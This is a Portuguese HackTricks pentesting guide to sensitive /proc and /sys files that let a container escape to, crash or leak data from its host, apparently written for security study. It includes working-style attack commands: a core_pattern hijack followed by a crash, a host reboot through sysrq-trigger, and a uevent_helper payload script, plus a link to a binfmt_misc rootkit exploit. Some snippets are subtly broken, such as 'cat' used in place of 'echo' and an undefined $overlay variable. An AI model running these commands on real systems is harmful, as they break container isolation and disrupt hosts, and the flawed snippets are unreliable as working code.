Devido à falta de suporte a namespaces, a exposição de `/proc` e `/sys` oferece uma fonte significativa de superfície de ataque e vazamento de informações. Inúmeros arquivos dentro do `procfs` e `sysfs` oferecem riscos de escape de contêiner, modificação do host ou vazamento básico de informações que poderiam facilitar outros ataques.

Para abusar dessas técnicas, pode ser suficiente apenas **configurar algo como `-v /proc:/host/proc` de forma incorreta**, já que o AppArmor não protege `/host/proc` porque o **AppArmor é baseado em caminhos**.

# procfs

## /proc/sys

`/proc/sys` normalmente permite o acesso para modificar variáveis do kernel, frequentemente controladas por meio de `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) define um programa que é executado na geração de arquivos de núcleo (tipicamente uma falha de programa) e o arquivo de núcleo é passado como entrada padrão se o primeiro caractere deste arquivo for um símbolo de pipe `|`. Este programa é executado pelo usuário root e permitirá até 128 bytes de argumentos de linha de comando. Isso permitiria a execução trivial de código dentro do host do contêiner, dado qualquer falha e geração de arquivo de núcleo (que pode ser simplesmente descartado durante uma infinidade de ações maliciosas).
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contém o caminho para o carregador de módulo do kernel, que é chamado ao carregar um módulo do kernel, como via o comando [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html). A execução de código pode ser obtida realizando qualquer ação que acione o kernel a tentar carregar um módulo do kernel (como usar a cripto-API para carregar um módulo de criptografia atualmente não carregado, ou usar ifconfig para carregar um módulo de rede para um dispositivo não usado atualmente).
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) é uma flag global que determina se o kernel entrará em pânico quando uma condição de Out of Memory (OOM) for atingida (em vez de invocar o OOM killer). Isso é mais um ataque de negação de serviço (DoS) do que uma fuga de contêiner, mas não deixa de expor uma habilidade que só deveria estar disponível para o host.

### /proc/sys/fs

O diretório [/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) contém uma série de opções e informações sobre vários aspectos do sistema de arquivos, incluindo informações de cota, handle de arquivo, inode e dentry. A escrita neste diretório permitiria vários ataques de negação de serviço contra o host.

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) permite a execução de formatos binários diversos, o que geralmente significa que vários **interpretadores podem ser registrados para formatos binários não nativos** (como Java) com base em seu número mágico. Você pode fazer o kernel executar um binário registrando-o como manipuladores.\
Você pode encontrar um exploit em [https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc): _Poor man's rootkit, leverage_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst)_'s_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _option to escalate privilege through any suid binary (and to get a root shell) if `/proc/sys/fs/binfmt_misc/register` is writeable._

Para uma explicação mais detalhada desta técnica, consulte [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) dependendo das configurações de `CONFIG_IKCONFIG_PROC`, isso expõe uma versão compactada das opções de configuração do kernel para o kernel em execução. Isso pode permitir que um contêiner comprometido ou malicioso descubra e ataque facilmente áreas vulneráveis habilitadas no kernel.

## /proc/sysrq-trigger

`Sysrq` é um mecanismo antigo que pode ser invocado por meio de uma combinação especial de teclado `SysRq`. Isso pode permitir uma reinicialização imediata do sistema, emissão de `sync(2)`, remontagem de todos os sistemas de arquivos como somente leitura, invocação de depuradores do kernel e outras operações.

Se o convidado não estiver devidamente isolado, ele poderá acionar os comandos [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) escrevendo caracteres no arquivo `/proc/sysrq-trigger`.
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) pode expor mensagens do buffer de anel do kernel normalmente acessadas via `dmesg`. A exposição dessas informações pode ajudar em exploits do kernel, desencadear vazamentos de endereços do kernel (que poderiam ser usados para ajudar a derrotar a Randomização do Espaço de Endereço do Kernel (KASLR) do kernel) e ser uma fonte de divulgação geral de informações sobre o kernel, hardware, pacotes bloqueados e outros detalhes do sistema.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contém uma lista de símbolos exportados do kernel e seus locais de endereço para módulos dinâmicos e carregáveis. Isso inclui também a localização da imagem do kernel na memória física, o que é útil para o desenvolvimento de exploits do kernel. A partir desses locais, o endereço base ou o deslocamento do kernel pode ser localizado, o que pode ser usado para superar a Randomização do Espaço de Endereço do Kernel (KASLR).

Para sistemas com `kptr_restrict` definido como `1` ou `2`, este arquivo existirá, mas não fornecerá nenhuma informação de endereço (embora a ordem em que os símbolos são listados seja idêntica à ordem na memória).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) expõe interfaces para o dispositivo de memória do kernel `/dev/mem`. Embora o PID Namespace possa proteger contra alguns ataques por meio desse vetor `procfs`, essa área tem sido historicamente vulnerável, considerada segura e novamente encontrada [vulnerável](https://git.zx2c4.com/CVE-2012-0056/about/) para escalonamento de privilégios.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) representa a memória física do sistema e está em um formato de núcleo ELF (geralmente encontrado em arquivos de despejo de núcleo). Não permite a gravação nessa memória. A capacidade de ler este arquivo (restrito a usuários privilegiados) pode vazar o conteúdo da memória do sistema host e de outros contêineres.

O tamanho do arquivo relatado representa a quantidade máxima de memória fisicamente endereçável para a arquitetura e pode causar problemas ao lê-lo (ou falhas dependendo da fragilidade do software).

[Despejando /proc/kcore em 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` é uma interface alternativa para [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (acesso direto ao qual é bloqueado pela lista branca do dispositivo cgroup), que é um arquivo de dispositivo de caractere que representa a memória virtual do kernel. Ele permite a leitura e gravação, permitindo a modificação direta da memória do kernel.

## /proc/mem

`/proc/mem` é uma interface alternativa para [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (acesso direto ao qual é bloqueado pela lista branca do dispositivo cgroup), que é um arquivo de dispositivo de caractere que representa a memória física do sistema. Ele permite a leitura e gravação, permitindo a modificação de toda a memória. (Requer um pouco mais de habilidade do que `kmem`, pois os endereços virtuais precisam ser resolvidos para endereços físicos primeiro).

## /proc/sched\_debug

`/proc/sched_debug` é um arquivo especial que retorna informações de agendamento de processos para todo o sistema. Essas informações incluem nomes de processos e IDs de processo de todos os namespaces, além de identificadores de cgroup de processo. Isso efetivamente contorna as proteções do PID namespace e pode ser explorado em contêineres não privilegiados.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contém informações sobre pontos de montagem no namespace de montagem do processo. Ele expõe a localização do `rootfs` ou imagem do contêiner.

# sysfs

## /sys/kernel/uevent\_helper

`uevents` são eventos acionados pelo kernel quando um dispositivo é adicionado ou removido. Notavelmente, o caminho para o `uevent_helper` pode ser modificado escrevendo em `/sys/kernel/uevent_helper`. Em seguida, quando um `uevent` é acionado (o que também pode ser feito a partir do espaço do usuário escrevendo em arquivos como `/sys/class/mem/null/uevent`), o `uevent_helper` malicioso é executado.
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

Acesso ao ACPI e várias configurações de hardware para controle de temperatura, geralmente encontrados em laptops ou placas-mãe de jogos. Isso pode permitir ataques DoS contra o host do contêiner, o que pode até levar a danos físicos.

## /sys/kernel/vmcoreinfo

Este arquivo pode vazar endereços do kernel que podem ser usados para derrotar o KASLR.

## /sys/kernel/security

Em `/sys/kernel/security` é montada a interface `securityfs`, que permite a configuração dos Módulos de Segurança do Linux. Isso permite a configuração de políticas [AppArmor](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), e assim o acesso a isso pode permitir que um contêiner desative seu sistema MAC.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` expõe interfaces para interagir com as variáveis EFI na NVRAM. Embora isso não seja tipicamente relevante para a maioria dos servidores, o EFI está se tornando cada vez mais popular. Fraquezas de permissão até levaram a alguns laptops inutilizáveis.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` fornece uma interface para gravar na NVRAM usada para argumentos de inicialização do UEFI. Modificá-los pode tornar a máquina host inoperável.

## /sys/kernel/debug

`debugfs` fornece uma interface "sem regras" pela qual o kernel (ou módulos do kernel) pode criar interfaces de depuração acessíveis ao userland. Ele teve vários problemas de segurança no passado, e as diretrizes "sem regras" por trás do sistema de arquivos muitas vezes entraram em conflito com as restrições de segurança.

# Referências

* [Compreendendo e endurecendo contêineres Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusando de contêineres Linux privilegiados e não privilegiados](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
